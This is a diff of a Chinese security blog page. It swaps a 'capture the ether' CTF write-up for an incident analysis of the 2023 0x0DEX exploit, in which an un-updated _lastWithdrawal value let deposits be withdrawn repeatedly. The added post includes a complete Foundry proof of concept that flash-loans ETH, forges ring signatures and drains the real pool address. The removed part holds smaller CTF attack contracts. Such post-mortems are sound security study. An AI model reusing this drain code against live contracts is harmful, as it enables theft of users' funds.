@@ -4,11 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="capture the ether(上), Blog">
-    <meta name="description" content="capture the ether(上)Guess the new numberpragma solidity ^0.4.21;
-
-contract GuessTheNewNumberChallenge {
-    function Gue">
+    <meta name="keywords" content="20230911 0x0DEX, Blog">
+    <meta name="description" content="攻击介绍OxODexPool合约中的swapOnWithdrawal()方法被黑客利用，导致被盗取39.9964Ether(约$61K)。0x0DEX通过deposit()和withdraw()方法使用户能够私下转移资金。0x0DEX后来引">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +17,7 @@ contract GuessTheNewNumberChallenge {
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>capture the ether(上) | Blog</title>
+    <title>20230911 0x0DEX | Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -285,12 +282,12 @@ contract GuessTheNewNumberChallenge {
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">capture the ether(上)</h1>
+                    <h1 class="description center-align post-title">20230911 0x0DEX</h1>
                 </div>
             </div>
         </div>
@@ -312,13 +309,9 @@ contract GuessTheNewNumberChallenge {
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/">
-                                <span class="chip bg-color">智能合约安全</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -326,8 +319,8 @@ contract GuessTheNewNumberChallenge {
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/" class="post-category">
-                                区块链安全
+                            <a href="/categories/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/" class="post-category">
+                                攻击事件
                             </a>
                         
                     </div>
@@ -339,28 +332,28 @@ contract GuessTheNewNumberChallenge {
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-03-19
+                    2023-09-25
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-03-20
+                    2023-09-25
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    911
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    6 分
                 </div>
                 
 
@@ -380,393 +373,333 @@ contract GuessTheNewNumberChallenge {
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="capture-the-ether-上"><a href="#capture-the-ether-上" class="headerlink" title="capture the ether(上)"></a>capture the ether(上)</h1><h2 id="Guess-the-new-number"><a href="#Guess-the-new-number" class="headerlink" title="Guess the new number"></a>Guess the new number</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;
+                <h1 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h1><p>OxODexPool合约中的swapOnWithdrawal()方法被黑客利用，导致被盗取39.9964Ether(约$61K)。<br>0x0DEX通过deposit()和withdraw()方法使用户能够私下转移资金。0x0DEX后来引入了swapOnWithdrawal()方法，它通过允许用户私下交换他们的存款资金（ETH）来扩展协议的功能。这个交换取款功能被利用了。</p>
+<p>TX：0x00b375f8e90fc54c1345b33c686977ebec26877e2c8cac165429927a6c9bdbec</p>
+<h1 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h1><p>我们通过<a target="_blank" rel="noopener" href="https://explorer.phalcon.xyz/tx/eth/0x00b375f8e90fc54c1345b33c686977ebec26877e2c8cac165429927a6c9bdbec">phalcon</a>来分析。</p>
+<p>通过phalcon我们很容易发现怪异之处，当攻击者存入10Ether后通过swapOnWithdrawal()取出了价值9.97Ehter的USDC，然后攻击者又存入了0.1Ether，但依然能取出价值9.97Ether的USDC。很明显漏洞就在swapOnWithdrawal()中。</p>
+<pre><code>    function swapOnWithdrawal(
+        address tokenOut,
+        address payable recipient,
+        uint256 relayerGasCharge, 
+        uint256 amountOut,
+        uint256 deadline,
+        WithdrawalData memory withdrawalData
+    ) external {
+        require(recipient != address(0), "ZERO_ADDRESS");
 
-contract GuessTheNewNumberChallenge {
-    function GuessTheNewNumberChallenge() public payable {
-        require(msg.value == 0.001 ether);
-    }
+        withdraw(
+            recipient, 
+            withdrawalData,
+            relayerGasCharge
+        );
 
-    function isComplete() public view returns (bool) {
-        return address(this).balance == 0;
-    }
+        uint amountIn = _lastWithdrawal;
+        uint relayerFee = getRelayerFeeForAmount(amountIn);
 
-    function guess(uint8 n) public payable {
-        require(msg.value == 0.001 ether);
-        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
+        address payable relayerAddress = IOxODexFactory(factory).relayerAddress();
+        (bool sent, ) = relayerAddress.call{value: relayerFee}("");
+        require(sent, "FAILED_TO_SEND_RELAYER_FEE");
 
-        if (n == answer) {
-            msg.sender.transfer(0.002 ether);
-        }
-    }
-}
+        amountIn -= relayerFee;
 </code></pre>
-<p>很明显的伪随机数。因为合约之间的调用是在同一个区块当中的，也就是说，如果我们通过攻击合约进行调用guess，那么我们攻击合约生成的answer与guess生成的answer是相同的。</p>
-<pre><code>contract attack{
-    Guess guesst;
-    function attack(address _addr)public{
-        guesst = Guess(_addr);
-    }
-    function attacks()public payable{
-        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
-        guesst.guess.value(0.001 ether)(answer);
-    }
-    function()external payable{                               
-        
-    }
-}
-</code></pre>
-<h2 id="Predict-the-future"><a href="#Predict-the-future" class="headerlink" title="Predict the future"></a>Predict the future</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;
-
-contract PredictTheFutureChallenge {
-    address guesser;
-    uint8 guess;
-    uint256 settlementBlockNumber;
-
-    function PredictTheFutureChallenge() public payable {
-        require(msg.value == 1 ether);
-    }
-
-    function isComplete() public view returns (bool) {
-        return address(this).balance == 0;
-    }
-
-    function lockInGuess(uint8 n) public payable {
-        require(guesser == 0);
-        require(msg.value == 1 ether);
-
-        guesser = msg.sender;
-        guess = n;
-        settlementBlockNumber = block.number + 1;
-    }
-
-    function settle() public {
-        require(msg.sender == guesser);
-        require(block.number > settlementBlockNumber);
-
-        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
-
-        guesser = 0;
-        if (guess == answer) {
-            msg.sender.transfer(2 ether);
-        }
-    }
-}
-</code></pre>
-<p>又是预测数很明显answer只在0~9之间。爆破即可。</p>
-<pre class=" language-1"><code class="language-1">contract attack{
-    Predict guess;
-   function attack(address _addr)payable{
-       guess=Predict(_addr);
-       geuss.lockInGuess.value(1 ether)(5);
-    }
-    function attacks(address _addr)public payable{
-     
-       uint8 n =5;
-       uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
-        if (n==answer){
-            guess.settle();
-        
+<p>通过代码我们能发现发给我们的 amountIn = _lastWithdrawal - relayerFee。_lastWithdrawal在withdraw中被赋值。</p>
+<pre><code>if(withdrawalData.wType == Types.WithdrawalType.Direct){
+            _sendFundsWithRelayerFee(withdrawalData.amount - relayerGasCharge, recipient);
         }else{
-            return;
+            _lastWithdrawal = withdrawalData.amount - relayerGasCharge;
         }
+</code></pre>
+<p>很明显_lastWithdrawal并不会再每提款时更新，只在使用WithdrawalType.Swap时更新。思路已经明了。</p>
+<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>// SPDX-License-Identifier: SEE LICENSE IN LICENSE
+pragma solidity  ^0.8.10;
+
+import "forge-std/Test.sol";
+import "./interface.sol";
+
+// Attacker : https://etherscan.io/address/0xcf28e9b8aa557616bc24cc9557ffa7fa2c013d53
+// Attacker Contract : https://etherscan.io/address/0xc44ea7650b27f83a6b310a8fed9e9daf2864a65b
+// Vulnerable Contract : https://etherscan.io/address/0x29d2bcf0d70f95ce16697e645e2b76d218d66109
+// Tx : 0x00b375f8e90fc54c1345b33c686977ebec26877e2c8cac165429927a6c9bdbec
+
+library Types {
+    enum WithdrawalType {
+        Direct,
+        Swap
+    }
+}
+
+struct WithdrawalData {
+    uint256 amount;
+    uint256 ringIndex;
+    uint256 c0;
+    uint256[2] keyImage;
+    uint256[] s;
+    Types.WithdrawalType wType;
+}
+
+interface IOxODexPool {
+    function deposit(
+        uint256 _amount,
+        uint256[4] memory _publicKey
+    ) external payable;
+
+    function withdraw(
+        address payable recipient,
+        WithdrawalData memory withdrawalData,
+        uint256 relayerGasCharge
+    ) external;
+
+    function swapOnWithdrawal(
+        address tokenOut,
+        address payable recipient,
+        uint256 relayerGasCharge,
+        uint256 amountOut,
+        uint256 deadline,
+        WithdrawalData memory withdrawalData
+    ) external;
+
+    function getCurrentRingIndex(
+        uint256 amountToken
+    ) external view returns (uint256);
+
+    function getRingHash(
+        uint256 _amountToken,
+        uint256 _ringIndex
+    ) external view returns (bytes32);
+}
+
+contract ContractTest is Test {
+    IOxODexPool private constant OxODexPool = IOxODexPool(0x3d18AD735f949fEbD59BBfcB5864ee0157607616);
+    WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+    IBalancerVault private constant BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    Uni_Router_V2 private constant Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+
+    uint256 private constant Bx = 1368015179489954701390400359078579693043519447331113978918064868415326638035;
+    uint256 private constant By = 9918110051302171585080402603319702774565515993150576347155970296011118125764;
+    uint256 private constant Hx = 2286484483920925456308759965850684826720807236777393886284879343816677643124;
+    uint256 private constant Hy = 1804024400776434902361310543986557260474938171670710692674407862657333646188;
+    uint256 private constant curveN = 0x30644e72e131a029b85045b68181585d2833e84879b9709143e1f593f0000001;
+
+    function setUp() public {
+        vm.createSelectFork("mainnet", 18115707);
+        vm.label(address(OxODexPool), "OxODexPool");
+        vm.label(address(WETH), "WETH");
+        vm.label(address(USDC), "USDC");
+        vm.label(address(BalancerVault), "BalancerVault");
+        vm.label(address(Router), "Router");
+    }
+
+    function testExploit() public {
+        deal(address(this), 0 ether);
+        uint256 loan = 11 ether;
+
+        address[] memory tokens = new address[](1);
+        tokens[0] = address(WETH);
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = loan;
+
+        BalancerVault.flashLoan(address(this), tokens, amounts, "");
+        emit log_named_decimal_uint(
+            "Attacker ETH balance after exploit",
+            address(this).balance,
+            18
+        );
+    }
+
+    function receiveFlashLoan(
+        address[] memory,
+        uint256[] memory amounts,
+        uint256[] memory fees,
+        bytes memory
+    ) external payable {
+        
+        WETH.withdraw(amounts[0]);
+        exploit();
+
+        USDC.approve(address(Router), type(uint256).max);
+        address[] memory path = new address[](2);
+        path[0] = address(USDC);
+        path[1] = address(WETH);
+        Router.swapExactTokensForETH(
+            USDC.balanceOf(address(this)),
+            0,
+            path,
+            address(this),
+            block.timestamp
+        );
+        WETH.deposit{value: amounts[0] + fees[0]}();
+        WETH.transfer(address(BalancerVault), amounts[0] + fees[0]);
+    }
+
+    function exploit() internal {
+        
+        uint256 poolETHBalance = address(OxODexPool).balance;
+        poolETHBalance =
+            10 ether -
+            (poolETHBalance - (poolETHBalance / 10 ether) * 10 ether);
+        new ForceSend{value: poolETHBalance}();
+
+        WithdrawalData memory w;
+        
+        uint256 ringIndex = deposit(10 ether);
+        w = withdrawData(address(this), 10 ether, ringIndex);
+        w.wType = Types.WithdrawalType.Swap;
+        OxODexPool.swapOnWithdrawal(
+            address(USDC),
+            payable(address(this)),
+            0,
+            0,
+            block.timestamp,
+            w
+        );
+
+        while (address(OxODexPool).balance &gt;= 10 ether) {
+            ringIndex = deposit(0.1 ether);
+            w = withdrawData(address(this), 0.1 ether, ringIndex);
+            
+            OxODexPool.swapOnWithdrawal(
+                address(USDC),
+                payable(address(this)),
+                0,
+                0,
+                block.timestamp,
+                w
+            );
+        }
+    }
+
+    function addFee(uint256 realAmount) internal pure returns (uint256 total) {
+        total = realAmount + (realAmount * 9) / 1000;
+    }
+
+    function deposit(uint256 amount) internal returns (uint256 ringIndex) {
+       
+        uint256[4] memory pks = [0x1, 0x2, Bx, By];
+        ringIndex = OxODexPool.getCurrentRingIndex(amount);
+        OxODexPool.deposit{value: addFee(amount)}(amount, pks);
+    }
+
+    function withdrawData(
+        address recv, 
+        uint256 amount,
+        uint256 ringIndex
+    ) internal view returns (WithdrawalData memory w) {
+        bytes32 ringHash = OxODexPool.getRingHash(amount, ringIndex);
+        uint256[2] memory c;
+        uint256[2] memory s;
+        (c, s) = generateSignature(ringHash, recv);
+
+        w.amount = amount;
+        w.ringIndex = ringIndex;
+        w.c0 = c[0];
+        w.keyImage = [Hx, Hy];
+        w.s = new uint256[](2);
+        w.s[0] = s[0];
+        w.s[1] = s[1];
        
     }
-    function()external payable{
 
-    }
-}
-</code></pre>
-<h2 id="Pridict-the-block-hash"><a href="#Pridict-the-block-hash" class="headerlink" title="Pridict the block hash"></a>Pridict the block hash</h2><pre class=" language-1"><code class="language-1">contract PredictTheBlockHashChallenge {
-    address guesser;
-    bytes32 guess;
-    uint256 settlementBlockNumber;
+   
+    function generateSignature(
+        bytes32 ringHash,
+        address recv
+    ) public view returns (uint256[2] memory c, uint256[2] memory s) {
+        uint256[2] memory G;
+        uint256[2] memory H;
+        uint256[2] memory B;
+        G[0] = 0x1;
+        G[1] = 0x2;
+        H[0] = Hx;
+        H[1] = Hy;
+        B[0] = Bx;
+        B[1] = By;
 
-    function PredictTheBlockHashChallenge() public payable {
-        require(msg.value == 0.001 ether);
-    }
-
-    function isComplete() public view returns (bool) {
-        return address(this).balance == 0;
-    }
-
-    function lockInGuess(bytes32 hash) public payable {
-        require(guesser == 0);
-        require(msg.value == 0.001 ether);
-
-        guesser = msg.sender;
-        guess = hash;
-        settlementBlockNumber = block.number + 1;
-    }
-
-    function settle() public {
-        require(msg.sender == guesser);
-        require(block.number > settlementBlockNumber);
-
-        bytes32 answer = block.blockhash(settlementBlockNumber);
-
-        guesser = 0;
-        if (guess == answer) {
-            msg.sender.transfer(0.002 ether);
-        }
-    }
-}
-</code></pre>
-<p>这个题需要我们提前知道后一个区块的区块哈希。block.blockhash只能得到256个区块内的哈希值，一旦超过256的区块，就会返回0。</p>
-<pre class=" language-1"><code class="language-1">contract attack{
-    Predict guess;
-    uint256 public blocknumber;
-    bytes32 answer;
-    function attack(address _addr)public{
-        guess = Predict(_addr);
-    }
-    function lock()public payable{
-        blocknumber = block.number+1;
-        guess.lockInGuess.value(0.001 ether)(answer);
-    }
-    function attacks()public{
-        require(block.number-256>blocknumber);
-        guess.settle();
-    }
-    function ()external payable{
-
-    }
-}
-</code></pre>
-<h2 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a>Token whale</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;
-
-contract TokenWhaleChallenge {
-    address player;
-
-    uint256 public totalSupply;
-    mapping(address => uint256) public balanceOf;
-    mapping(address => mapping(address => uint256)) public allowance;
-
-    string public name = "Simple ERC20 Token";
-    string public symbol = "SET";
-    uint8 public decimals = 18;
-
-    function TokenWhaleChallenge(address _player) public {
-        player = _player;
-        totalSupply = 1000;
-        balanceOf[player] = 1000;
+      
+        c[1] = createHash(ringHash, recv, G, H);
+      
+        s[1] = 1;
+        c[0] = createHash(
+            ringHash,
+            recv,
+            ecAdd(G, ecMul(B, c[1])),
+            ecMul(H, c[1] + 1)
+        );
+       
+        s[0] = curveN + 1 - c[0];
     }
 
-    function isComplete() public view returns (bool) {
-        return balanceOf[player] >= 1000000;
-    }
-
-    event Transfer(address indexed from, address indexed to, uint256 value);
-
-    function _transfer(address to, uint256 value) internal {
-        balanceOf[msg.sender] -= value;
-        balanceOf[to] += value;
-
-        emit Transfer(msg.sender, to, value);
-    }
-
-    function transfer(address to, uint256 value) public {
-        require(balanceOf[msg.sender] >= value);
-        require(balanceOf[to] + value >= balanceOf[to]);
-
-        _transfer(to, value);
-    }
-
-    event Approval(address indexed owner, address indexed spender, uint256 value);
-
-    function approve(address spender, uint256 value) public {
-        allowance[msg.sender][spender] = value;
-        emit Approval(msg.sender, spender, value);
-    }
-
-    function transferFrom(address from, address to, uint256 value) public {
-        require(balanceOf[from] >= value);
-        require(balanceOf[to] + value >= balanceOf[to]);
-        require(allowance[from][msg.sender] >= value);
-
-        allowance[from][msg.sender] -= value;
-        _transfer(to, value);
-    }
-}
-</code></pre>
-<p>这题有逻辑漏洞和下溢。transferFrom前面一系列检查都是检查的from，然而转账的时候却是转的msg.sender。且balanceOf[msg.sender] -= value存在下溢。</p>
-<h2 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;
-
-contract RetirementFundChallenge {
-    uint256 startBalance;
-    address owner = msg.sender;
-    address beneficiary;
-    uint256 expiration = now + 10 years;
-
-    function RetirementFundChallenge(address player) public payable {
-        require(msg.value == 1 ether);
-
-        beneficiary = player;
-        startBalance = msg.value;
-    }
-
-    function isComplete() public view returns (bool) {
-        return address(this).balance == 0;
-    }
-
-    function withdraw() public {
-        require(msg.sender == owner);
-
-        if (now < expiration) {
-            // early withdrawal incurs a 10% penalty
-            msg.sender.transfer(address(this).balance * 9 / 10);
-        } else {
-            msg.sender.transfer(address(this).balance);
-        }
-    }
-
-    function collectPenalty() public {
-        require(msg.sender == beneficiary);
-
-        uint256 withdrawn = startBalance - address(this).balance;
-
-        // an early withdrawal occurred
-        require(withdrawn > 0);
-
-        // penalty is what's left
-        msg.sender.transfer(address(this).balance);
-    }
-}
-</code></pre>
-<p>想要转走钱withdraw函数显然行不通。那只能是collectPenalty函数。只要让uint256 withdrawn = startBalance - address(this).balance下溢即可。<br>通过自毁合约强行转入1eth即可。</p>
-<pre class=" language-1"><code class="language-1">contract attack{
-    function attacks(address _addr)public payable{
-        selfdestruct(_addr);
-    }
-}
-</code></pre>
-<h2 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;
-
-contract MappingChallenge {
-    bool public isComplete;
-    uint256[] map;
-
-    function set(uint256 key, uint256 value) public {
-        // Expand dynamic array as needed
-        if (map.length <= key) {
-            map.length = key + 1;
-        }
-
-        map[key] = value;
-    }
-
-    function get(uint256 key) public view returns (uint256) {
-        return map[key];
-    }
-}
-</code></pre>
-<p>这题就是考对可变数组的储存的理解。</p>
-<p>slot[0]存iscomplete,slot[1]存储数组的长度，数组的data存储在：keccak256(bytes(1))+x，x就是数组的下标。</p>
-<p>计算数组data起始位：</p>
-<pre class=" language-1"><code class="language-1">contract attack{
-    uint256 public i;
-    function attacks()public {
-      i =2**256-uint256(keccak256(bytes32(1)));
-    }
-}
-</code></pre>
-<p>i就是我们算出来的slot[0]的位置。</p>
-<h2 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;
-
-contract DonationChallenge {
-    struct Donation {
-        uint256 timestamp;
-        uint256 etherAmount;
-    }
-    Donation[] public donations;
-
-    address public owner;
-
-    function DonationChallenge() public payable {
-        require(msg.value == 1 ether);
-        
-        owner = msg.sender;
-    }
     
-    function isComplete() public view returns (bool) {
-        return address(this).balance == 0;
+    function ecAdd(
+        uint256[2] memory p,
+        uint256[2] memory q
+    ) internal view returns (uint256[2] memory r) {
+        assembly {
+            
+            let fp := mload(0x40)
+            mstore(fp, mload(p))
+            mstore(add(fp, 0x20), mload(add(p, 0x20)))
+            mstore(add(fp, 0x40), mload(q))
+            mstore(add(fp, 0x60), mload(add(q, 0x20)))
+            pop(staticcall(gas(), 0x06, fp, 0x80, r, 0x40))
+        }
     }
 
-    function donate(uint256 etherAmount) public payable {
-        // amount is in ether, but msg.value is in wei
-        uint256 scale = 10**18 * 1 ether;
-        require(msg.value == etherAmount / scale);
-
-        Donation donation;
-        donation.timestamp = now;
-        donation.etherAmount = etherAmount;
-
-        donations.push(donation);
+    
+    function ecMul(
+        uint256[2] memory p,
+        uint256 k
+    ) internal view returns (uint256[2] memory kP) {
+        assembly {
+            let fp := mload(0x40)
+            mstore(fp, mload(p))
+            mstore(add(fp, 0x20), mload(add(p, 0x20)))
+            mstore(add(fp, 0x40), k)
+            pop(staticcall(gas(), 0x07, fp, 0x60, kP, 0x40))
+        }
     }
 
-    function withdraw() public {
-        require(msg.sender == owner);
+    function createHash(
+        bytes32 ringHash,
+        address recv,
+        uint256[2] memory p1,
+        uint256[2] memory p2
+    ) internal pure returns (uint256 hash) {
         
-        msg.sender.transfer(address(this).balance);
+        assembly {
+            let fp := mload(0x40)
+            mstore(fp, 0x1)
+            mstore(add(fp, 0x20), 0x2)
+            mstore(add(fp, 0x40), Bx)
+            mstore(add(fp, 0x60), By)
+            mstore(add(fp, 0x80), Hx)
+            mstore(add(fp, 0xa0), Hy)
+
+            mstore(add(fp, 0xd4), recv)
+            mstore(add(fp, 0xc0), ringHash)
+
+            
+            mstore(add(fp, 0xf4), mload(p1))
+            mstore(add(fp, 0x114), mload(add(p1, 0x20)))
+            mstore(add(fp, 0x134), mload(p2))
+            mstore(add(fp, 0x154), mload(add(p2, 0x20)))
+
+            hash := mod(keccak256(fp, 0x174), curveN)
+        }
+    }
+
+    receive() external payable {}
+}
+
+contract ForceSend {
+    IOxODexPool private constant OxODexPool =
+        IOxODexPool(0x3d18AD735f949fEbD59BBfcB5864ee0157607616);
+
+    constructor() payable {
+        selfdestruct(payable(address(OxODexPool)));
     }
 }
 </code></pre>
-<p>注意到donate函数里面结构体的声明并没有初始化，也没有说明存储在那里，所以默认是在storage上，所以slot[0]是Donation[ ]，slot[1]是owner。又因为结构体在函数内非显式地初始化的时候会使用storage存储而不是memory，所以就可以达到变量覆盖的效果。我们用etherAmoun覆盖owner就行了。</p>
-<h2 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h2><p>```1<br>pragma solidity ^0.4.21;</p>
-<p>contract FiftyYearsChallenge {<br>    struct Contribution {<br>        uint256 amount;<br>        uint256 unlockTimestamp;<br>    }<br>    Contribution[] queue;<br>    uint256 head;</p>
-<pre><code>address owner;
-function FiftyYearsChallenge(address player) public payable {
-    require(msg.value == 1 ether);
-
-    owner = player;
-    queue.push(Contribution(msg.value, now + 50 years));
-}
-
-function isComplete() public view returns (bool) {
-    return address(this).balance == 0;
-}
-
-function upsert(uint256 index, uint256 timestamp) public payable {
-    require(msg.sender == owner);
-
-    if (index &gt;= head &amp;&amp; index &lt; queue.length) {
-        // Update existing contribution amount without updating timestamp.
-        Contribution storage contribution = queue[index];
-        contribution.amount += msg.value;
-    } else {
-        // Append a new contribution. Require that each contribution unlock
-        // at least 1 day after the previous one.
-        require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);
-
-        contribution.amount = msg.value;
-        contribution.unlockTimestamp = timestamp;
-        queue.push(contribution);
-    }
-}
-
-function withdraw(uint256 index) public {
-    require(msg.sender == owner);
-    require(now &gt;= queue[index].unlockTimestamp);
-
-    // Withdraw this and any earlier contributions.
-    uint256 total = 0;
-    for (uint256 i = head; i &lt;= index; i++) {
-        total += queue[i].amount;
-
-        // Reclaim storage.
-        delete queue[i];
-    }
-
-    // Move the head of the queue forward so we don't have to loop over
-    // already-withdrawn contributions.
-    head = index + 1;
-
-    msg.sender.transfer(total);
-}
-</code></pre>
-<p>}<br>require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days)很明显存在一个溢出的问题，只要数组最后一个元素的unlockTimestamp够大，就会出现溢出。</p>
-<p>在upsert函数,当index小于数组长度时，就会覆盖原来的Contribution。 当index大于等于数组长度时，就会有新的Contribution，amount会覆盖queue的length，unlockTimestamp会覆盖head。</p>
-<p>方法：<br>1：传入index（大于1）,timestamp为溢出值。<br>2：传入index（大于2）,timestamp为0。<br>3；调用withdraw函数。</p>
 
                 
             </div>
@@ -793,7 +726,7 @@ function withdraw(uint256 index) public {
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://willcking.github.io/2023/03/19/capture-the-ether-%E4%B8%8A/">https://willcking.github.io/2023/03/19/capture-the-ether-%E4%B8%8A/</a>
+                    <a href="https://willcking.github.io/2023/09/25/20230911-0x0DEX/">https://willcking.github.io/2023/09/25/20230911-0x0DEX/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -830,11 +763,7 @@ function withdraw(uint256 index) public {
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/">
-                                    <span class="chip bg-color">智能合约安全</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -911,66 +840,18 @@ function withdraw(uint256 index) public {
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2023/03/19/capture-the-ether-%E4%B8%8B/">
+                <a href="/2023/09/25/20230911-0x0DEX/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="capture the ether(下)">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="20230911 0x0DEX">
                         
-                        <span class="card-title">capture the ether(下)</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-03-19
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/" class="post-category">
-                                    区块链安全
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">智能合约安全</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/03/09/Damn-Defi-%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="Damn-Defi-题解（下）">
-                        
-                        <span class="card-title">Damn-Defi-题解（下）</span>
+                        <span class="card-title">20230911 0x0DEX</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -981,27 +862,61 @@ function withdraw(uint256 index) public {
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-09
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-25
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/" class="post-category">
-                                    区块链安全
+                            <a href="/categories/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/" class="post-category">
+                                    攻击事件
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">智能合约安全</span>
-                    </a>
-                    
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/09/24/20230921-CEXISWAP/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="20230921 CEXISWAP">
+                        
+                        <span class="card-title">20230921 CEXISWAP</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
